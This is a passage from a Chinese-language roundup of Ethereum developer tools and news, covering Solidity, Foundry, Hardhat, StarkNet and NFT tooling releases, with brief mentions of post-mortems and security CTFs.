实现，用于测试\n\n\neth-sdk：使用地址，为一个合约创建一个类型安全的 SDK\n\n\n在使用 onlyOwner 修改器时，Solidity 的 存储项内动态数组会覆盖掉合约存储项\n\n\nVyper v0.3.0：重构传统后端\n\n\nmev-inspect-py：发现矿工支付、代币转账、互换和套利\n\n\n代币部署模型, 将 token 根（root）部署到主网或者 Layer 2.\n\n\nethereum-cryptography v1.0: 小15倍，5个依赖； 有趣的细节\n\n\nSolidity gas 优化: 用 v0.8.4+ 版本, 利用 calldata 函数参数，immutable变量， 更短回退提示字符串/自定义错误 及 优化循环\n\n\n最小构造函数字节码\n\n\nClonesWithImmutableArgs: 通过替换存储负载降低创建和使用成本，代理将附加参数到委托调用的 calldata。\n\n\nEC20Wrapper 指南, 将现有的 ERC20 打包应用到链上治理\n\n\nZKP Private Airdrop: 用户提供公开承诺，以后会使用 Merkle 树的 zk 证明\n\n\nTwitter 空投: 从 Twitter 回复提取地址和ENS 作为空投地址\n\n\n恒定利率发售协议: 调整 NFT 销售价格以达到目标利率，与 Justin Roiland (Rick 和 Morty 的创造者)合作\n\n\nSolidity Metadata Playground: 解码元数据哈希，在Sourcify或Etherscan查看通过验证的合约，如果验证通过，可在 Remix 中打开\n\n\nc4udit: 简单的 Solidity 分析器, 非严重问题按日常描述\n\n\nTenderly 模拟器: 访问有预期结果的待处理交易\n\n\n原生的使用 zkSNARKs 的组签名, 概念证明留言板，发布者只能是组内成员\n\n\nReplit （基于网页的开发者环境）添加了 Solidity 支持：无需安装、内置测试网、合约实时编辑（热重载）、dapp 及合约可以分享\n\n\nHardhat VSCode 插件将在 2022 年推出\n\n\nEthernautDAO 挑战：在挑战中学习 Solidity 和 web3 开发\n\n\nJolly Roger：使用 Hardhat、Svelte 和 The Graph 升级合约模板\n\n\n使用 Hardhat 的暴力探究 ERC20 合约的存储项布局\n\n\nEthTx v.0.3.1：升级代理合约的处理，为未知的签名和 ENS 感知使用 4 字节的目录\n\n\ntopic0：从哈希到事件日志签名的数据库，用于日志解码、从 Sourcify 验证合约中抽取数据\n\n\nRICKS：碎片化 NFT 的实现，带有确定性的收购、定制化的拍卖和一个质押池\n\n\n设计 NFT 启动器的指南：重点关注不可爆破的公平性、避免竞态条件（race conditions）以及成本效率、参看实现\n\n\nCircom v2.0（零知识电路编译器），用 Rust 重写，编译速度提高 10 倍\n\n\njs-ethereum-cryptography v0.2.0：密码学元件，体积减小 15 倍，使用 3 个依赖库，实验性阶段，有待安全审计\n\n\nprb-proxy：在一笔交易中执行多次调用，新颖的 DSProxy ，带有确定性的代理地址以及第三方权限控制\n\n\nERC721 的智能批量拍卖，Paradigm 的 NFT 启动设计的实现\n\n\ntemplate-ethereum-contracts：使用 Hardhat 部署的 Soliity 模板，升级了 dapptool 测试\n\n\nstarkex-clientlib-js：StarkEx API 的 JavaScript 封装器\n\n\nstarknet-devnet：Starknet 虚拟网络的 Flask 封装器\n\n\n从部署 USM 稳定 token 中学到的 13 件事\n\n\nNomic Labs (HardHat) 正在开发 Rethnet（用 Rust 写的本地 EVM 开发网络）和 Slang（Solidity 编译器，主打开发者工具）\n\n\nRemix IDE v0.19.0\n\n\nsolmate v5.0.0（Solidity 合约）：SSTORE2、CREATE3、固定点数据库、灵活授权和 ERC20 重放保护\n\n\nStudio 721：配置、部署和验证 ERC721 NFT，延伸自 OpenZeppelin 合约，有风险，仍在 Rinkeby 中测试\n\n\n新版 Typechain：可导出 Solidity 结构体，更好地处理错误\n\n\nhardhat-shorthand：全局的 npm 包，叫做 hh，运行本地安装的 Hardhat， 并支持 shell 自动完成任务\n\n\nEtherscan 加入 Solidity 定制化报错消息\n\n\nethers.js 支持从供应商处单次调用获得 ENS avatar\n\n\n用命令行使用 TrueBlocks chifra 查询合约值并构建一个 地址/token 的完整历史\n\n\nSTARKs 教程已支持 Python 代码\n\n\nzk-NFT：允许用户使用 zkSNARK 来证明所有权和元数据特征\n\n\nSolidity 文档代码示例可以用 Remix 打开\n\n\nsolidity-trigonometry：基本的三角函数，sin 和 cos 运算耗费约 2K~2.5K gas\n\n\nnft-swap-sdk：TypeScript SDK，使用 ox v3 协议来封装 NFT\n\n\nNFT Floor Market：链上的 NFT 市场合约，除了版税没有手续费，尚未得到审计\n\n\nStarkNet playground：编译和部署 Cairo 合约\n\n\nWarp（Solidity 到 Cairo 的转译器）示例：转译两个可以组合的合约并部署它们\n\n\nstarknet-react-example：徜徉的逻辑和案例，使用 Circom 语言实现为 SNARK\n\n\nplonkit：与 Circom 搭配使用的 zkSNARK 工具箱\n\n\n以太坊代码查看器:在 VS Code 的浏览器实例中打开 Etherscan 验证过的合约，支持多文件合约和代理，只需将Etherscan 合约的 URL 从”.io “改为”.deth.net”\n\n\nHardhat v2.8.0:为分叉不支持的网络自定义硬分叉历史\n\n\nOtterscan v2021.12.02:支持恢复原因和自定义错误\n\n\nStarkNet.py: 用于 Python 的 StarkNet SDK\n\n\nApeWorX: 基于 Python 的模块化开发框架，beta 版\n\n\nSubway:用于 UniswapV2 配对的三明治机器人示例\n\n\n以查询历史最低价为例对比分析BigQuery、Nansen和Dune\n\n\nMakerDAO 开发人员调查\n\n\nSolidity v0.8.11：Solidity 语言服务最小功能集，只有本地二进制，还没有自动完成，连接到喜欢的IDE和反馈；abi.encodeCall 增加用于检查提供的值是否匹配预期的类型\n\n\nEtherscan 增加了对 Natspec 的初步支持：在读取和写入合约标签时查看通知、参数和返回描述\n\n\nWalletConnect v2 测试版 Swift 和 Kotlin SDKs\n\n\nhardhat-deploy-tenderly：将部署合约推送到 Tenderly 进行调试\n\n\nYul-Log：编写和使用Yul+合约，支持Truffle，Hardhat正在进行中\n\n\nsipping-oe(scaffold-eth)：将链上 SVG NFTs 部署到 Optimism 的启动工具包\n\n\nethereum-code-viewer：增加了对Arbitrum，Optimism 和测试网的支持\n\n\nens2airdrop：从”drop your ENS” Twitter线程收集地址\n\n\nHelios：正在进行基于 ERC1155 的交换\n\n\nCairo-jupyter：Cairo的Jupyter内核\n\n\n使用 CrytoPunk 检查器示例构建一个MEV 检查器的指南\n\n\nNotion支持 Solidity 代码块\n\n\nSolidity 语言服务器解释器:每个支持语言服务器的IDE都可以对Solidity提供开箱即用的支持\n\n\nFoundry forge run命令，以脚本形式运行单文件合约，支持作弊码、主网分叉和调试日志\n\n\n使用 Echidna 的 Fuzzing 复杂项目案例：使用 Sushi 的BentoBox\n\n\nYul &amp; Solidity 的高级优化提示\n\n\nOpenZeppelin Nile v0.3.0 (StarkNet 项目在开罗): 部署帐户和发送交易，主网和Görli兼容\n\n\n短字符串（代码链接）:immutable bytes32 可用于短字符串(Solidity不支持immutable字符串)在视图函数中转换回字符串\n\n\nerc721-drop: 空投 NFT 模板，适用于发行量有上限及价格为固定，使用 Solmate，用 Foundry 测试，AGPL v3\n\n\n使用链下签名服务的Captcha-protected NFT distribution\n\n\nMerkle-airdrop-starter: 开源的用于空投的脚本、合约和前端代码库\n\n\nPolygon 缺少 balance/allowance 检验剖析文章，90亿 MATIC 有风险，80万 MATIC 被盗，Bug 修复，支付 220万美元+ 50万MATIC 奖金\n\n\nBent Finance剖析文章，开发者流氓升级合约，捏造了（硬编码）存款，攻击这同意资金返还。\n\n\nSolmate v6 (Solidity 库): 启用 ERC721 和 ERC1155 , 快速的数学运算（ sqrt, fpow &amp; fdiv）, MultiRolesAuthority; 经过审计, AGPL V3 授权\n\n\nethers.js v5.5.3: 添加Kintsugi网络和avatar修复\n\n\nFoundry cast wallet: 创建新钱包，获取地址，签名信息和验证数字签名\n\n\nwagmi:React Hooks 库，用于钱包、ENS、合约，交易和签名；MIT 授权\n\n\nweb3modal v1.9.5: 支持 Coinbase Wallet，加入新的嵌入（injected）Provider\n\n\nsolidity-shell v0.0.10: Solidity v0.8.11, 基础组件可自动补全\n\n\nhardhat-etherscan v3.0.0: 支持多 API keys\n\n\nlil-web3: web3协议的简化版本，便于理解如何工作;ENS, OpenSea，Fractional, Juicebox,闪电贷和多重签名\n\n\n为什么你应该在Solidity合约中使用NatSpec注释\n\n\nAustin Griffith的web2开发挑战\n\n\nFaucETH: Goerli, Rinkeby, Kovan, Kintsugi, Arbitrum Rinkeby 和 Optimism Kovan的测试网水龙头\n\n\ncairostarter: StarkNet项目的迷你模板；AGPL v3 授权\n\n\nhashtree: SHA256库优化默克尔树计算\n\n\nSuperStruct: 用于版本数据的Rust库\n\n\nFoundry: 调试器: 逐句调试交易并高亮显示操作码、堆栈、内存和源码\n\n\nFoundry 并行 EVM 测试: 加速单元和模糊测试\n\n\nForge (Foundry 测试框架) 入门\n\n\nOpenZeppelin 合约 v4.5 候选版本 公开代码 Review\n\n\nHardhat-marmite: 用于对比 Solidity 片段 gas 消耗的 Hardhat 插件\n\n\nxdeployer v1.1.0: 用于部署具有确定地址的合约的 Hardhat 插件（使用CREATE2），支持主网、Arbitrum, Optimism、和测试网\n\n\nSeatbelt: Governor Bravo 提案的测试套件，列出引用的地址，确认引用的合约已经过验证以及列出状态更改\n\n\nPaymentSplitter: 通过工厂使用 EIP1167 最小代理创建低成本splitters，固定成本小于 200k gas\n\n\nevm-codes: 添加预编译合约参考\n\n\nevm-puzzles: 新关卡，设置交易数据/价值，因此不会恢复\n\n\nstarknet-cairo-101: 学习 StarkNet 的一组练习\n\n\nBlocknative Transaction Preview API:在授权前模拟交易以便查看效果\n\n\nMatthew Green 对MetaMask crypto的简单审查\n\n\n以太坊数据仓库: 基于Snowflake 云，可查询的完整历史，及事件和发出调用之间的关系，当前为有限测试版\n\n\nForge (Foundry 测试框架) 入门指南\n\n\nForge replit, 在浏览器中运行 Forge , vanilla 设置\n\n\nGanache v7:本地区块链（以前叫ganache-cli）, 分叉速度提高30倍, 0配置主网分叉\n\n\nHardhat-Vyper v3.0.0: 修复了编译缓存的问题，移除了 Docker 依赖并支持编译多个 Vyper 版本\n\n\nMetaMask Flask: 实验功能的开发者分发版本，第一个功能是用于构建和插件 API 的 Snaps\n\n\nENS Offchain Resolver: 使用外部服务解析名称的入门工具包，准备开发测试，layer2/链下解决的第一步\n\n\nSolidity 函数使用支付修饰符更便宜, 非payable函数添加 msg.value 为0的 24 gas 检查\n\n\nevm-codes: 用 playground 分享了代码链接\n\n\nVestedERC20: 被包装为底层 token 线性归属其持有者的 ERC20\n\n\nTWAM: ERC721 的时间加权铸币价格\n\n\nMoonCats 通过特征深入研究链上生成艺术 NFT\n\n\n从7个特征中通过概率高效生成的新 ERC721\n\n\nPlaypen: gas 优化质押池合约，支持 ERC20 和 ERC721\n\n\nWeb3UIKit: 轻量级 UI 组件\n\n\nDune 分析资源 开始\n\n\nRinkeby 社交分享水龙头 又可以使用了！ Alchemy 的 Rinkeby 水龙头 无需身份验证\n\n\nFoundry gas 报告: 执行测试时产生的 gas 消耗报告\n\n\nHardhat 路线图: 改进默认体验, 可以选择退出默认体验\n\n\nRemix v0.21: 迁移到 React ，更新了备份和恢复, 添加了 StarkNet 插件， 移除不再需要的 Optimism 插件\n\n\nEthereumJS:\n\nVM v5.7: 为调试和更轻松的状态管理定制的操作码动态 gas 消耗\n客户端 v0.3: 为日志、交易收据和交易哈希添加了 RPC 端点服务，并支持 Sepolia 测试网\nTX v3.5: 额外的数据完整性检查\n\n\n\nEthers.js v5.5.4: 支持无效的 IPFS URI 格式\n\n\nExcessivelySafeCall: Solidity 库，通过指定要复制的最大字节数来调用不受信任的合约并防止返回炸弹\n\n\nCloaks: 可以出价和显示方案的ERC721，铸造价格是一种投标ERC721 ; SPADES 变体: 中标者将获得铸币折扣，每铸币一次，公共铸币价格会增加一次，每出一个区块就会衰减一次\n\n\nCairo 语言服务器: 添加 Cairo 支持，实现语言服务器协议（如 VS Code）的 IDE ，早期预览\n\n\nCairo Math 64×61: 固定点 64.61 数学库\n\n\n用以太坊登录， 参考文档\n\n\n一次性使用地址指南, 无需私钥(Nick 的方法)\n\n\n主网上的 Alchemy NFT API\n\n\n在 Ropsten 测试网上， 0x 协议 v4 NFT 交换, off-chain 和 on-chain 列表, 更低的gas 成本\n\n\n3D 交互式 NFT 使用 gITF (图形语言传输格式)\n\n\n构建链上 SVG NFT 项目的推文风暴\n\n\nOpenSea的 NFT 创建指南 ，使用 Hardhat, IPFS 和OpenZeppelin\n\n\n面向 web2 前端开发者们的 web3 简介\n\n\nOpenZeppelin Contracts v4.5.0: Base64 编码, NFT 版税标准, NFT 投票, 最短投票时间\n\n\nUnderhanded Solidity Contest: 用意想不到的交易建立一个 DEX\n\n\n2021 年 Solidity 开发者调查结果\n\n\n关于支持捕获 Solidity 自定义 错误的反馈\n\n\nNomic 基金会: 非营利性以太坊公益组织，将扩展 Hardhat 工具套件; 总共需要筹集3000 万美元，已经筹集了 1500 万美元；Rethnet &amp; Slang 项目\n\n\nForge: 在测试中分叉主网/测试网指南\n\n\n使用 Forge 标准库 设置一个地址的 token 余额\n\n\n激励机器人调用合约: 用 ETH/WETH 支付, 没有输入, 没有债券/注册, 没有不安全的外部调用，只在有意义的时候调用\n\n\nSlither Action: 在 GitHub Actions 工作流程中运行 Slither 静态分析器\n\n\nYield 从预言机计算价格的方法\n\n\nToken Gate: 使用 TypeScript 模块为 ERC20/721/777/1155 的余额设置阀值开关\n\n\nFlashbots Proxy: 提供交互构建和提交 flashbots bundle 的简单方法\n\n\n选择支持 Layer2 项目的钱包\n\n\nStarkNet React: 针对 StarkNet 的 React hooks ，由 starknet.js 支持。\n\n\nStarknet 的全栈指南 ：使用 Nile, Starknet.py 和 cairopal\n\n\ncircom-ecdsa: ECDSA电路在circom中的概念证明实现，circom是一种用于指定ZK电路的编程语言。这些电路可以用来生成zkSNARKs。\n\n\nSolidity 中的 EVM symbolic 执行引擎 ：仅用于学习的不同的逻辑程序\n\n\n给 web2 数据分析师的 web3 数据指南\n\n\nSolidity v0.8.12: 减小 JavaScript/Wasm 二进制文件大小, solc-js 部分移植到 TypeScript ， bug 修复\n\n\nFoundry fuzzer: 改进了随机 uint 生成，使用假定作弊码丢弃不符合标准的 fuzz 运行\n\n\nBlacksmith: Foundry 的用户合约生成器，像 EOA 用户一样测试合约交互\n\n\nFoundry Rust Monorepo 模板用于快速开发Rust应用程序，该应用程序利用Foundry进行合约开发。\n\n\nTruffle v5.5.0: 引入 Truffle Dashboard ，允许使用现有的 MetaMask 钱包签名，支持MetaMask硬件钱包\n\n\nBrownie v1.18.0: 支持 Ganache v7，覆盖 eth_call 的存储，为每种语言配置 EVM 版本并使用最新的编译器设置\n\n\nNethereum (.Net 库) v4.2.0: 可读的 ABI, EIP712 改进, 支持 GnosisSafe, MultiSend\n\n\nctc: 用于EVM 链历史数据分析的Python 包和 CLI\n\n\nHeliaia: 在广播之前分析交易，位于钱包和节点之间\n\n\n使用如msg.sender的视图函数值检查链下评估\n\n\nStealthDrop: ERC20 空投，可以使用 zk 证明匿名领取，目前存在漏洞\n\n\nnoble-ed25519 v1.6.0: ZIP-215 支持, 由Cure53审核\n\n\nENS 合约地图\n\n\n深入了解OlympusDAO合约\n\n\n以太坊解释器中的账户\n\n\n用Replit进行Solidity开发 (基于web的IDE)\n\n\nfoundry deploy: Foundry的部署脚本, 进行中\n\n\n和产品路线图的 UX 研究需要 Remix beta 测试人员\n\n\nRemix DGit 插件 将文件推送到GitHub的指南\n\n\n用Truffle Dashboard 通过 MetaMask 部署, 支持 Truffle 和 Hardhat\n\n\nCacheable Beacon Proxy: 升级部署消耗超过 100 gas\n\n\nShrines: 是包含地址和资产记录的列表-分类账，任何人可将任意数量的 ERC20 token 按资产比例分配到地址，因为gas消耗是恒定的\n\n\nETH-Hentai: 通用合约和实用程序的 Python 库\n\n\nw3:Go 包，支持 ABI 的模块化 JSON RPC 客户端\n\n\n用 Ethereum Ruby 库(alpha)登录，有Rails示例\n\n\nEthereum 和 StarkNet 数据仓库: 公开测试版，用 Snowflake云\n\n\nTrueBlocks入门\n\n\n黑暗森林游戏用EIP2535（钻石）替换升级系统\n\n\nDynamic SVG NFT: 铸造 NFT ，设置SVG, 用 scaffold-eth 构建原型\n\n\nethernaut-x-foundry: Ethernaut CTF 用 Foundry 在本地运行\n\n\nHardhat v2.9.0: 主网分叉更快，用新版Mocha进行并行测试，合约可以并行编译，Hardhat Network新的RPC方法可以很快挖大量区块\n\n\n怎样使用gITF(图形语言传输格式)构建3D 交互 on-chain NFT\n\n\nEVM 用一个简单的存储合约遍历操作码\n\n\n使用 Arbitrum 地址注册表减少 calldata 的指南\n\n\nTrueBlocks beta: 支持 ENS , docker 版本, 基于 OpenAPI 的服务, 监控, 索引 EVM ，在 IPFS 和 Unchained Index 共享\n\n\nEth Testing: 生成模拟 Web3 Provider 并在测试中模拟区块链交互，alpha\n\n\nstarknet-scaffold: 使用 Nile 和 pytest 模板\n\n\n使用 MetaMask 对用户进行身份验证的Rails 教程\n\n\nOptimizing Echidna fuzzer: Haskell 代码分析发现瓶颈\n\n\nHardhat 针对 VS Code 的扩展: Solidity 代码补全, code 导航, 格式化， 快速修复建议；公测\n\n\nethers.js 更新 和 v5.6.0: 为 ENS 解析器、ENS 解析器和 Cloudflare Worker 添加支持 CCIP 读取\n\n\nWalletConnect v1.7.4: 修复事件监听器注册\n\n\nMulticall3:多个常量函数调用的聚合结果\n\n\nPRBProxy v2.0.0 (一次交易多次调用): 提高gas效率\n\n\nChainalysis 预言机，用于验证加密货币钱包地址是否包含在制裁指定中\n\n\nSolwaifu: 最少gas消耗的字节码， 未经审计\n\n\nEthsig-rs: Cloudflare worker 启用使用以太坊登录服务\n\n\n运行StarkNet Voyager区块浏览器的本地版本\n\n\nweb3-starknet-react: 受 web3-react 启发\n\n\nDamn Vulnerable DeFi (CTF) Foundry version\n\n\nevm-puzzles: 交互式版本，改进的字节码显示和 evm.codes 游乐场链接\n\n\nEthernaut的EVM golf 挑战\n\n\nNFT 随机性: 难以预测的铸币算法和技术\n\n\nContract 记忆浏览器\n\n\nDevPill.me: 区块链开发指南\n\n\nSolidity v0.8.13: 修复 abi.encodeCall 错误，准备好 Yul IR 管道生产，优化器可以避免堆栈太深，在文件级别和全局使用，并添加到语言服务器的定义\n\n\nRemix v0.22: 增加浏览器存储容量，使用 Mocha 进行 JavaScript 单元测试，调试器搜索 Sourcify 和 Etherscan 以获取经过验证的代码\n\n\nFoundry 研讨会 视频: 不变测试的设置、测试、调用跟踪、调试和预览以及更智能的工具\n\n\nChainlink Foundry 入门套件: VRFv2, MockOracle 和 有提示的部署脚本\n\n\nethers js v5.6.1: 用错误的发送者修复 CCIP 读取\n\n\nEthernaut 发布的 Solidity trivia\n\n\n写给普通开发者的 Gas 优化基础: 升级 Solidity 版本, 使用不可变变量, 使用unchecked {}, 自定义错误, 避免计数器，避免复制到内存\n\n\nERC4626.sol: 代币化保险库实现\n\n\n收入分配代币: ERC4626 线性收入发行，未经审计，Foundry 中的单元/模糊测试， dapptools 中的不变测试\n\n\nhardhat-circom v3.0.0: 默认使用 circom2 编译器\n\n\nDune dashboard 通过 Ethereum 和 Optimism 上的部署地址获取合约\n\n\nethereumjs/vm v5.8.0: 支持 Kiln v2 , EIP3540 EVM 对象格式化, EIP3670 EOF – 代码验证, EIP3860 限制并计量初始化代码以及改进Layer 2 的支持\n\n\nTypeChain v8 (TypeScript typings): 修复嵌套结构数组的类型生成, 提高铸造集成 ，尽可能在生成文件中使用import type\n\n\nHardhat VSCode extension v0.2.0: 悬停显示变量、函数调用等类型信息\n\n\nHardhat v2.9.2: 修复导致分叉功能停止工作的问题\n\n\nEBMP:在 Solidity 中为链上 BMP NFT 渲染 BMP 图像\n\n\nMagicCounter: Solidity 计数器 , 增量/递减/获取最大/小值 O(1)\n\n\nDapptools 将火炬传递给了 Foundry\n\n\nOpinionated Foundry 项目配置指南\n\n\nHardhat 项目模板 (基于 Typescript): 添加使用 Foundry 的测试\n\n\ncreate-eth-app v1.8.0: 集成 useDapp 框架\n\n\nStarkNet 开发指南\n\n\nNile v0.5.0: 支持 Cairo v0.8.0, 与最新的 Account 合约一起使用的Signer\n\n\n将ether .js升级到5.6.1激活ENS L2/Offchain集成\n\n\nAlchemy 的 Goerli 测试网水龙头\n\n\nFoundry v0.2.0: 编译和测试更快、调用跟踪、gas 报告、交互式调试、更多的作弊码、更智能的模糊器、TOML 配置，易于安装；Docker 镜像\n\n\n合约模板:配置了 GitHub 操作的 Foundry 模板\n\n\nFoundry-Yulp-Template: Yul+ 合约模板,用 Foundry 进行测试\n\n\n用 Foundry 调用跟踪、作弊码和调试器解决 ParadigmCTF 的 JOP 挑战\n\n\nForta Hardhat 插件: 为合约添加安全/操作监控\n\n\nSolidity 小事, 一个 Patrick Collins 的帖子\n\n\nSourcify （源码验证）增加了对 Sepolia 测试网的支持\n\n\n使用 POW 的 Goerli ETH 水龙头\n\n\nMetaMask Snaps 教程\n\n\n用 Shamir 的秘密分享分享助记词\n\n\nFoundry 分叉模式测试 - 从 Etherscan 的 API 获取合约源/ABI 解码跟踪\n\n\nEthereumJS 的早期 EIP 实现-EIP-3540 EVM 对象格式实验\n\n\nBokkyPooBah 的 DateTime 库的形式化验证\n\n\nStreamPie: 代币化 Sablier 流，代币持有者可以rageStream分叉他们自己的按比例的 Sablier 流\n\n\nSolidity中的位翻转技术，在井字游戏（tic-tac-toe ）中的应用\n\n\nsolvm: 用 Yul 和 Solidity 实现的精简版 EVM\n\n\nTrustus: 为合约提供来自受信任服务器的链下数据\n\n\nEVM 绘制合约:在 EVM 合约中绘制每个字节的代码，快速了解智能合约的形状。\n\n\nGateRepo: ERC20 代币 gated 私有 GitHub 存储库\n\n\n深入研究web3.py内部结构: JSON-RPC往返\n\n\nEchidna v2.0.1: 添加了 Foundry 支持，错误修复\n\n\nOpenZeppelin Cairo v0.1.0 合约: 账户抽象、ERC20 和 ERC721 实现，Ownable, Pausable, SafeMath 和 代理\n\n\nGitPOAP: 为开源做出贡献的 POAP\n\n\nUnderhanded Solidity 比赛获胜者\n\n\nRemix v0.23.0: 改进缓存，通过 natspec 编译后运行脚本\n\n\nethereumjs/vm v5.9.0: EIP3651(warm coinbase), EIP1153 (瞬时存储操作码) ，自定义预编译\n\n\nFoundry 主要仓库 整合到一个 GitHub 组织中\n\n\nUnimock:根据需要对特定调用作出回应的合约\n\n\nHot-chain-svg: 链上 SVG 工具包、热重载、可视化测试和库\n\n\nNFT gas 优化 指南\n\n\nNethereum (.Net 库) v4.3.0:改进了以太坊登录、以及对ERC 代币和 ENS 合约、日志处理的支持\n\n\nuseDapp v1.0 (dapp 开发框架): 多链支持、WalletConnect集成和自定义链配置\n\n\nUniswap Labs Swap Widget: 用于代币交换的 React 组件\n\n\nCenter.dev NFT React 组件: 在 React 应用程序中嵌入 NFT\n\n\n添加以太坊登录的Auth0 指南\n\n\nOtterscan v2022.04.01:代币转账显示其估计的美元价值，测试网水龙头快速链接\n\n\n在 Foundry 中编写 ERC20 测试的指南\n\n\n用于 VS Code 扩展的 Truffle：部署和调试合约并运行 Ganache\n\n\nSolidity 平方根：基于 Solmate，平均便宜约 50 gas\n\n\nweb3 参考手册: 用 React、TypeScript 和 wagmi 的前端代码片段\n\n\n用以太坊登录的Token gated图像库教程\n\n\n基于 DeFi 合约漏洞利用的Semgrep （静态分析）规则\n\n\nSolidity Fuzzing Boilerplate: 用 Echidna 和 Foundry 运行模糊测试\n\n\nSlither v0.8.3: 支持 Foundry，允许用户通过代码注释增强 Slither，增加了一个新的工具来读取链上的变量存储值(slither-read-storage)\n\n\nVyper v0.3.2:动态数组，完整的 ABI 类型支持；3个漏洞披露\n\n\nCairo 的 OpenZeppelin 合约 Wizard: 支持 ERC20 和 ERC721\n\n\nAmarna: Cairo 静态分析器和 linter\n\n\nLivepeer 入门指南\n\n\n测试网提醒: Ropsten 将升级为 PoS；Ropsten &amp; Rinkeby 将被弃用；用 Goerli 和 Sepolia 测试网\n\n\nOpenZeppelin Contracts v4.6.0：增强跨链的可移植性、Governor 参数化投票、合约升级重新初始化，合约安全性改进\n\n\nGanache v7.1.0：用 eth_call 覆盖地址状态\n\n\n: extension for governance voting based on underlying asset\n\n\nERC4626Votes：基于基础资产的治理投票扩展\n\n\n对 Solidity 中的内存错误进行模糊测试\n\n\nwagmi v0.3.0 (React hooks)：缓存、React 18 支持, vanilla JS 客户端\n\n\nEIP712 Codegen：为 EIP712 解码生成 Solidity\n\n\nIntelliJ Solidity 调试器插件\n\n\nMetaMask Snaps 教程，用于管理 Snap 中的状态并添加 API\n\n\ndEth 工具：在线单位转换、解码器和编码器\n\n\nDune添加 Flashbots 数据；查询套利、清算，sandwiches数据\n\n\n0xPARC：ZK 机器学习教程和演示\n\n\n[GitHub Copilot suggested a private key, configure copilot so your key isn’t suggested\n\n\nGitHub Copilot 建议使用私钥，配置 copilot\n\n\nFoundry Anvil: 本地测试网节点，用 Rust 编写，替代 ganache-cli 或 hardhat 节点\n\n\nFoundry: 实现了 cast 和 forge 命令的快捷方式\n\n\nMockProvider v2:更新了 Solidity 模拟库，支持 Foundry\n\n\nAPI3 QRNG: 主网上的量子随机数预言机，Arbitrum 和 Optimism\n\n\n将 EIP2535 (钻石标准)与可升级代理一起使用\n\n\nTwitter 头像支持使用链上 SVG NFT\n\n\nMATT 拍卖合约草案——可变版本 NFT 拍卖，只接受一笔交易\n\n\nETK (etk是一组用于编写、读取和分析EVM字节码的工具) v0.2.1: 用户定义宏，反编译时猜测函数选择器\n\n\nWeb3.py v5.29.0: 支持外部模块\n\n\nMEV Inspect: JavaScript 接口mev-inspect-py\n\n\nRainbowKit: 钱包连接/管理库，用 wagmi React hooks\n\n\nHardhat-deploy: 增加支持在 zkSync 部署\n\n\nOpenZeppelin Defender: 支持 Optimism L2，通过 API 创建并管理Relayers，支持 Frame 钱包\n\n\nOpenSea Stream API: 测试版， 新的基于websocket的服务，让开发者能够接收发生在市场上的事件。\n\n\nsamczsun 的签名数据库: 支持查询function, error, event ，name等签名\n\n\n用可选访问列表减少读取多个存储槽的gas消耗\n\n\nThirdweb-deploy: 用 MetaMask 或 Gnosis Safe 部署合约\n\n\n用 Blocknative 的交易预览API，用户可以基于区块链的当前状态模拟两个或多个绑定的交易的结果。\n\n\nSepolia 测试网水龙头\n\n\nOxPARC Ecne: 自动验证 ZK 电路\n\n\n1inch 的 cumulative merkle 空投工具，在需要对相同地址进行定期空投的情况下，它有助于优化gas成本。\n\n\nSolidity v0.8.14: 修复了与直接来自 calldata 的 ABI 编码嵌套数组有关的错误，以及在某些继承结构中触发的，可能导致内存指针被解释为 calldata 指针的问题\n\n\nFoundry: Solidity 模型检查， 改进 Etherscan 验证\n\n\nmore-evm-puzzles: 侧重于CREATE和CALL操作码\n\n\nEVM 深入探讨: DELEGATECALL\n\n\nTx Uncled: 检查交易是否被取消\n\n\nFlashbots-cli: 与 Flashbots relay 交互\n\n\nCloudFlare 以太坊和 IPFS 网关对公共访问\n\n\nOpenSea Seaport: 去中心化 NFT 交换协议、gas 优化、MIT 许可、用 Foundry 模糊测试\n\n\nEtherscan Sepolia 测试网浏览器\n\n\nFaucet Link: 测试的网水龙头、状态、Sybil保护列表\n\n\nRinkeby 测试网将被弃用 ， 集中到 Geth 团队 ，复杂的合并\n\n\nTim Beiko 的合并提醒: DIFFICULTY 操作码将返回 PREVRANDAO，12s 块时间 (减去错过的槽) 而不是 ~13s\n\n\nethers js v5.6.8: 更新 BN.js 的十六进制错误, 不会再出现在在evm安全范围内(即256位数字)\n\n\n官方 ethers js 的补充\n\n\nFoundry:\n\nForge Snippets对 VS code 的支持\n支持签名数据库\nFoundry 和 Hardhat的使用指南\n\n\n\nERC721A v4.0.0: 移除 OpenZeppelin 合约依赖，可升级版本用 EIP2535 (钻石标准)\n\n\nMergeReward: 合约在合并后通过检查难度大于 2^64 来支付第一个调用者\n\n\nRemco 的 Yul 解析器: 基于 Rust\n\n\nWeb3.py 自定义选项: 中间件, 自定义方法, 外部模块 ，自定义 provider\n\n\ndApp Starter ，用 Typescript, Next.js, Tailwind CSS, RainbowKit, ethers 和 wagmi\n\n\nRainbowKit 铸造 NFT 的 demo\n\n\nHop airdrop sybil hunt: Union-Find graph 算法在 O(1) 时间内找到连接的subgraph组件\n\n\nStackExchange以太坊自定义网站设计的信息搜集\n\n\nPatrick McCorry 的加密课程资源 (8节)\n\n\nPatrick Collins: 用 JavaScript 进行 web3 开发 (32 小时的视频)\n\n\nFoundry Solidity 脚本和部署\n\n\nthirdweb deploy – 无私钥部署流程，auto-Sourcify 验证， 用于 React/Node/Python/Go 的自动SDK\n\n\nDelegatable: 用于签署链下消息的Solidity库，可将不可转让权授予其他人\n\n\nMEV Explorer: mev-inspect-js 前端; 支持 Eth, Polygon, 和 Arbitrum。\n\n\n在Tornado Cash 的 Nova 上用 Circom 实现零知识彩票\n\n\nRemix v0.24.0: 项目模板, Solidity 编译配置文件选项, 将代码发布到指定的 IPFS 端点\n\n\nOtterscan 支持 Erigon 2 alpha\n\n\nRopsten 节点 docker-compose模板 ，它启动Otterscan + Erigon Alpha + Prysm 的ropsten实例。产生一个为合并后准备好的ropsten存档节点，该节点带有一个嵌入式块资源管理器(Otterscan)，这意味着可以在本地运行。\n\n\n为Ropsten 和 Goerli 测试，MultiFaucet增加到 100 个测试ETH\n\n\nEtherscan ERC1155 代币传输事件端点\n\n\nweb3 脚手架: Foundry, Next.js, RainbowKit, subgraph\n\n\nRainbowKit CLI: scaffold RainbowKit, wagmi 和 Next.js app\n\n\nEthereum 数据仓库指南，查询NFT铸币和交易\n\n\nOxPARC zkREPL: zkSNARK 基于 web 的开发环境\n\n\nSolidity v0.8.15: 修复了优化器在内联汇编中删除一些内存写入的问题（由 Certora 发现），修复了在复制字节数组时写入脏值的问题，改进了事件和自定义错误的内联和选择器\n\n\nTenderly 添加无服务功能, 沙盒, 